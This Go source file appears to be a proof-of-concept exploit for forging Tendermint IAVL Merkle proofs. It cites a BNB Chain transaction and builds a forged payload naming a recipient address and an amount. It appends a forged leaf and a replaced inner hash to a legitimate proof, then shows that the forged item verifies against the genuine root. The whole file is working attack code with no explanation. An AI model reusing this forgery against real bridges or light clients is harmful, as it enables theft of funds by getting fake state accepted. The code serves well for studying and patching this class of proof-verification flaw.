package main

import (
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/tendermint/iavl"
	"github.com/tendermint/tendermint/crypto/merkle"
	"github.com/tendermint/tendermint/crypto/tmhash"
)

func mustDecode(str string) []byte {
	if strings.HasPrefix(str, "0x") {
		str = str[2:]
	}
	b, err := hex.DecodeString(str)
	if err != nil {
		panic(err)
	}
	return b
}

func getValueOp(legitProofBytes []byte) iavl.IAVLValueOp {
	var legitProof merkle.Proof
	if err := legitProof.Unmarshal(legitProofBytes); err != nil {
		panic(err)
	}

	legitValueOpIntf, err := iavl.IAVLValueOpDecoder(legitProof.Ops[0])
	if err != nil {
		panic(err)
	}

	return legitValueOpIntf.(iavl.IAVLValueOp)
}

func main() {
	// https://bscscan.com/tx/0xe93f7c385e2510007f0b9319f001fed0fc1d718604fbab5c8afaa55fe0bfb624
	legitPayloadBytes := mustDecode("0x00000000000000000000000000000000000000000000000000000e35fa931a0000f86ea0424e42000000000000000000000000000000000000000000000000000000000094000000000000000000000000000000000000000088018fb570626fa400942218ffe5fd6215aefb988c5130b109047ef903cc943cf604378ded77537f02ed2d082a609a0235864b84633f540c")
	legitProofBytes := mustDecode("0x0af8090a066961766c3a76120e00000100380200000000010dda4d1add09db090ad8090a2f081910978cb90818a6b892810122206a972442231cdcbd083f53f5b6e7d1364d01a7c3e39481a393663421d9d91e730a2f081810c5cdba0518a6b89281012220015e9258171954de124eadca473471c85a218d1b4f30ab6046123df79b143e100a2f081710c58dbb0218a6b89281012220653ec3905c6eea07cd6122664c235a5bbee741796e9beb0090b651f1881aa6af0a2e081610c58d7c18a6b8928101222010da239ec014e3708bb63394a6ac659bf0a5775e01fb061ba47489f5a70a1e590a2e081510c58d4c18a6b8928101222016d590ab6e451029d6e0fe2e414519bad0722c7960915b09709a8d79489e689f0a2e081410c58d1c18a6b892810122206e5d42435b893a6ef3d2c3226dc3d8fc6298b50765c14401717cce9d4779b1740a2e081310c58d1018a6b89281012220a66c4e211073542bdfbe41b7ffb3c97233e1328e08307585572572e2086a70660a2e081210c58d0a18a6b89281012220bbea65146adcbf69db8aa5d40ea78b2881bbe49a1550a7848a2a15c0bd8c72a10a2e081110c58d0418a6b89281012a20b209c6eae3c638eedee790ba4ac4ba1a28e6ee9e508c312890faf68203f6c8f40a2e081010cfb60218a6b892810122205ea9f3914db297bb2a2167c73b48d65ef750412881a41b26431b505e1b0807120a2e080f10cfb60118a6b892810122206edc69967bdccfa5341c641bd114685664731b6fbc1eb5ae0255e5668050ae1c0a2d080e10cf7618a6b89281012220245256c699761062ee26233725281d53bff60d087e638efb01d7cfc2ccc042f20a2d080d10cf3618a6b8928101222022ed28f7b77e2939b6de5947f76be014455ca91bb158fbeee88c8f6428b285120a2d080c10cf1618a6b8928101222092ead60656d3de32a46b5103aa914b786576f7be80c82dc769e2246dfe3b43ff0a2d080b10cf0e18a6b892810122200de250a575819ad357b89726d95ff6337f644ad81972f16d21171ad50c4621060a2d080a10cf0618a6b89281012220e170c2cf4413e475fdeff411c28e5cbfa50e6c642eaa5b95cad752e53ac2f89d0a2d080910cf0218a6b8928101222016622f912b4b40e830cfddbca2aacdcb03f29e012aa0841b09598247d0fe7fd30a2d080810cf0118a6b8928101222031aa9188c3bf0870796542b3291cf9c0b4264cb05a7206844cec6eab3ed4485d0a2c0807104f18a6b8928101222068c7d5d1a61de64b294a73c830779d3d140cd6d1812efd36b01f3616a210da7c0a2c0806102f18a6b892810122201bfed012d1294aedcdd46d4519d41e8b7903aec21fb50276d68df1c0f1eeaa810a2c0805101f18a6b892810122208b5140b3f84965769728c21dad7765685f15fbea97addd4a18e0e19fbfa812dc0a2c0804100f18a6b892810122206212ddc1731eb3c7275c22028461ca618adb69ca958b970ba70a69efcaf746f00a2c0803100718a6b8928101222027d509ed505ba5189c02e09a8cebbd8da88b0f9fb80bd493303e956396d5fa7d0a2c0802100318a6b892810122204ee30871caf373210ae36efc699cb4dd1c1517c5715f1f771cbcc3e1763cbb760a2c0801100218a6b8928101222086053a337c6c00c08b0150f4b04c25d46a545bfca4ffd23bcb9f4bab5620a9c41a380a0e00000100380200000000010dda4d1220c9702dc684f40f649086354efd81036405d65bd7973b33a49bd094ada8bea34118a6b89281010ac2060a0a6d756c746973746f726512036962631aae06ac060aa9060a0f0a0376616c12080a0608a9b89281010a100a046d61696e12080a0608a9b89281010a310a03616363122a0a2808a9b89281011220bebbffe66b498475751018685043f7f8af3748c11b474ae4bab1ed6f872a6afc0a390a0b61746f6d69635f73776170122a0a2808a9b89281011220c3c3e14f9855a19fbb7787ec7334e7d1e89515bc968bbd95a3c0757b73a0f8910a340a06706172616d73122a0a2808a9b8928101122023c2f8353abab04889611cf1df2db289c433739a0b862982eb101d6bceddf8f40a340a06746f6b656e73122a0a2808a9b892810112206c729e5786bc7e711151be2c8fae1da0e046dffdf63019c1b2cab9c393e005c70a180a0c7374616b655f72657761726412080a0608a9b89281010a340a06627269646765122a0a2808a9b892810112201696f48f0831247582113e127d54c8dfd5a83ce7d59f87b5dbc43d3289287f000a330a057374616b65122a0a2808a9b89281011220e125aa32d98388b262476bcb57bc67e5a561694c4b4ab7cdc276592a4c8102520a310a03696263122a0a2808a9b89281011220a430a90e5901412e8883d71166115a54bf31165d4300ca128d891f32bad715890a310a03646578122a0a2808a9b89281011220a83f009853645e8b594bdccff32ceaf235d7c17b0e3a9bfda9d24fb4b9e768da0a300a027363122a0a2808a9b89281011220e4adc46ac3861ca6ee345294c621d2bc048079dab94ee30333c4585e2cbe30890a370a0974696d655f6c6f636b122a0a2808a9b89281011220d73dee2cd461a123714cce39fa8f820706fa270dc290257d6295dd8c29a870500a310a03676f76122a0a2808a9b89281011220bc32151659d2d697d4258aacb0c2e7a5c6b3d3dda375c6c634fd58d61dedf4c00a360a08736c617368696e67122a0a2808a9b89281011220399a04243f1a0ad8f1b0487eb19aefe91a357446154ea2c59bee1143d4c17bbe0a340a066f7261636c65122a0a2808a9b89281011220bbabfac717aea0c30b0bc13da73e1a501450cdf5cd4a0b9feeb35b4b7c10242e0a330a057061697273122a0a2808a9b8928101122065a9c4ae2bba63d233c7fc28d81151880b0a4533df8cbed77660356ae0aa7c5b")

	forgedPayloadBytes := mustDecode("0x000000000000000000000000000000000000000000000000000000000000000000f870a0424e4200000000000000000000000000000000000000000000000000000000009400000000000000000000000000000000000000008ad3c21bcecceda100000094489a8756c18c0b8b24ec2a2b9ff3d4d447f79bec94489a8756c18c0b8b24ec2a2b9ff3d4d447f79bec846553f100")
	forgedValueHash := tmhash.Sum(forgedPayloadBytes)

	legitValueOp := getValueOp(legitProofBytes)
	forgedValueOp := getValueOp(legitProofBytes)

	// we do a little forging
	forgedLeafNode := getValueOp(legitProofBytes).Proof.Leaves[0]
	forgedLeafNode.Key = append([]byte(nil), []byte(forgedValueOp.GetKey())...)
	forgedLeafNode.Key[13] = 255
	forgedLeafNode.ValueHash = forgedValueHash
	forgedValueOp.Proof.Leaves = append(forgedValueOp.Proof.Leaves, forgedLeafNode)
	forgedValueOp.Proof.InnerNodes = append(forgedValueOp.Proof.InnerNodes, iavl.PathToLeaf{})
	forgedValueOp.Proof.LeftPath[len(forgedValueOp.Proof.LeftPath)-1].Right = mustDecode("A038FCFB3DD5C419DF679CE76FDAB39D21149069D037C39034CEF55AFDB9631B")

	rootHash := legitValueOp.Proof.ComputeRootHash()
	verifyErr := legitValueOp.Proof.Verify(rootHash)
	fmt.Printf("legitOp rootHash=%X verifyErr=%v\n", rootHash, verifyErr)

	rootHash = forgedValueOp.Proof.ComputeRootHash()
	verifyErr = forgedValueOp.Proof.Verify(rootHash)
	fmt.Printf("forgedOp rootHash=%X verifyErr=%v\n", rootHash, verifyErr)

	{
		verifyErr = legitValueOp.Proof.VerifyItem([]byte(legitValueOp.GetKey()), legitPayloadBytes)
		fmt.Printf("legit verifyErr=%v\n", verifyErr)
		verifyErr = legitValueOp.Proof.VerifyItem(forgedLeafNode.Key, forgedPayloadBytes)
		fmt.Printf("forged verifyErr=%v\n", verifyErr)
	}

	{
		verifyErr = forgedValueOp.Proof.VerifyItem([]byte(legitValueOp.GetKey()), legitPayloadBytes)
		fmt.Printf("legit verifyErr=%v\n", verifyErr)
		verifyErr = forgedValueOp.Proof.VerifyItem(forgedLeafNode.Key, forgedPayloadBytes)
		fmt.Printf("forged verifyErr=%v\n", verifyErr)
	}
}